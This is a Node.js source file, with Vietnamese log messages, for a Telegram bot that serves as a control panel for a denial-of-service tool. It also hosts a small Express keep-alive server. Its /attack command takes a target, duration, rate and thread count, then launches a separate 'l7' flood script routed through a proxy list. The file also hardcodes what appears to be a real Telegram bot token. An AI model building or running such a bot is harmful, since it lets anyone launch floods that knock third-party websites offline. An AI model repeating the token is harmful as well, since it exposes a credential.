const TelegramBot = require('node-telegram-bot-api');
const { spawn } = require('child_process');
const express = require('express');

const TOKEN = '7937745403:AAGBsPZIbCTzvhYhsOFkL-IVAQc3m-ta-Dc';
const bot = new TelegramBot(TOKEN, { polling: true });

const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Bot hoạt động');
});

app.listen(PORT, () => {
  console.log(`Server chạy cổng ${PORT}`);
});

bot.on('message', (msg) => {
  console.log(`Nhận: ${msg.text} từ chat ${msg.chat.id}`);
});

bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, JSON.stringify({ message: "Bot khởi động. Dùng /attack [target] [time] [rate] [thread]" }, null, 2), { parse_mode: 'Markdown' });
});

bot.onText(/^\/attack\s+(.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1].split(/\s+/).filter(arg => arg);

  if (args.length !== 4) {
    bot.sendMessage(chatId, JSON.stringify({ error: "/attack [target] [time] [rate] [thread] ✅" }, null, 2), { parse_mode: 'Markdown' });
    return;
  }

  const [target, time, rate, thread] = args;

  if (!target || isNaN(time) || isNaN(rate) || isNaN(thread)) {
    bot.sendMessage(chatId, JSON.stringify({ error: "🚫" }, null, 2), { parse_mode: 'Markdown' });
    return;
  }

  try {
    const command = spawn('node', ['l7', target, time, rate, thread, 'proxy.txt']);

    const info = { target, time: `${time}s`, rate, thread, proxy: 'proxy.txt' };
    bot.sendMessage(chatId, JSON.stringify({ message: "📌 Attack Started!", info }, null, 2), { parse_mode: 'Markdown' });

    console.log(`[ATTACK] ${target} | ${time}s | ${rate} | ${thread}`);

    command.on('error', (error) => {
      console.error(`Lỗi spawn: ${error.message}`);
      bot.sendMessage(chatId, JSON.stringify({ error: `🚫 Lỗi: ${error.message}` }, null, 2), { parse_mode: 'Markdown' });
    });

    command.on('close', (code) => {
      console.log(`Hoàn thành mã: ${code}`);
      bot.sendMessage(chatId, JSON.stringify({ message: `ℹ️ Hoàn thành với mã: ${code}` }, null, 2), { parse_mode: 'Markdown' });
    });
  } catch (error) {
    console.error(`Lỗi thực thi: ${error.message}`);
    bot.sendMessage(chatId, JSON.stringify({ error: `🚫 Lỗi: ${error.message}` }, null, 2), { parse_mode: 'Markdown' });
  }
});

bot.on('polling_error', (error) => {
  console.error(`Lỗi polling: ${error.message}`);
});
